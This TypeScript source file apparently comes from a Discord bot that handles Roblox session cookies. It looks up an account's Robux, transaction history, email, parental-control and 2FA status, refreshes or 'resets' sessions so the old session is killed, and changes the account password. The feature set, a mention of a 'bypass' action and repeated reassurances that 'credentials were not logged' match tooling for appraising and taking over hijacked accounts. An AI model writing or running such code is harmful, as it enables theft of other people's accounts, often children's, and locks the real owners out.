// src/lib/actions.ts (runBypassAction removed noEmail logic since we handle it directly)
import * as Roblox from './roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildAccountEmbed,
} from './embed-helpers';

export async function runLoginAction(cookie: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }
  const userId = validation.userId!;
  const age = await Roblox.getUserAge(userId);
  const robux = await Roblox.fetchRobux(cookie, String(userId));
  const summary = await Roblox.fetchTransactionTotals(cookie, String(userId));
  const country = await Roblox.fetchCountry(cookie);
  const email = await Roblox.fetchEmailInfo(cookie);
  const parental = await Roblox.fetchParentalControls(cookie);
  const thumb = await Roblox.fetchAvatarThumbnail(String(userId));

  let emailStatus = 'No email found';
  if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
  else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;
  const parentStatus = parental.hasParent ? '✅ Parent linked' : '❌ No parent linked';

  const embed = buildAccountEmbed(
    validation.username!,
    validation.displayName || null,
    userId,
    age,
    robux,
    summary,
    country,
    emailStatus,
    parentStatus,
    thumb
  );
  return { success: true, embed };
}

export async function runRefreshAction(cookie: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }
  const result = await Roblox.refreshSession(cookie);
  if (result.success && result.newCookie) {
    const embed = buildSuccessEmbed(
      '✧ **Refresh Successful**\n' +
      `────\n` +
      `⭑ New cookie issued.\n` +
      `⭑ Your other sessions remain active.\n` +
      `⭑ Your credentials were not logged.`
    );
    return { success: true, embed, newCookie: result.newCookie };
  }
  return { success: false, embed: buildErrorEmbed('✧ **Refresh Failed**\n────\n⭑ Could not refresh the session. Please try again later.') };
}

export async function runResetAction(cookie: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }
  const result = await Roblox.killAndRefreshSession(cookie);
  if (result.success && result.newCookie) {
    const embed = buildSuccessEmbed(
      '✧ **Reset Successful**\n' +
      `────\n` +
      `⭑ New cookie issued.\n` +
      `⭑ Old session killed.\n` +
      `⭑ Your credentials were not logged.`
    );
    return { success: true, embed, newCookie: result.newCookie };
  }
  return { success: false, embed: buildErrorEmbed('✧ **Reset Failed**\n────\n⭑ Could not refresh the session. Please try again later.') };
}

export async function runClearAction(cookie: string) {
  const cleaned = Roblox.extractCookie(cookie);
  if (!cleaned) {
    return { success: false, embed: buildErrorEmbed('✧ **No Cookie Found**\n────\n⭑ No valid cookie token found.') };
  }
  const embed = buildSuccessEmbed(
    '✧ **Cleaned Cookie**\n' +
    `────\n` +
    `\`\`\`\n${cleaned}\n\`\`\`\n` +
    `────\n` +
    `⭑ Removed warning prefix and extra text.`
  );
  return { success: true, embed, cleanedCookie: cleaned };
}

export async function runChangePasswordAction(cookie: string, currentPassword: string, newPassword: string) {
  const validation = await Roblox.validateCookie(cookie);
  if (!validation.valid) {
    return { success: false, embed: validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed() };
  }
  const twoFactor = await Roblox.checkTwoFactorStatus(cookie, String(validation.userId!));
  if (twoFactor.enabled) {
    const embed = buildErrorEmbed(
      `✧ **2FA Detected**\n────\n` +
      `⭑ Authenticator is enabled on this account.\n` +
      `⭑ Password change is blocked for security.\n` +
      `⭑ Please disable 2FA first or use the official Roblox interface.`
    );
    return { success: false, embed };
  }
  const result = await Roblox.changePassword(cookie, currentPassword, newPassword);
  if (result.success) {
    const embed = buildSuccessEmbed(
      '✧ **Password Changed**\n' +
      `────\n` +
      `⭑ Your password has been updated successfully.\n` +
      `⭑ Your credentials were not logged.`
    );
    return { success: true, embed };
  }
  const embed = buildErrorEmbed(
    `✧ **Change Failed**\n────\n` +
    `⭑ ${result.error || 'Unknown error'}\n` +
    `⭑ Please check your current password and try again.`
  );
  return { success: false, embed };
}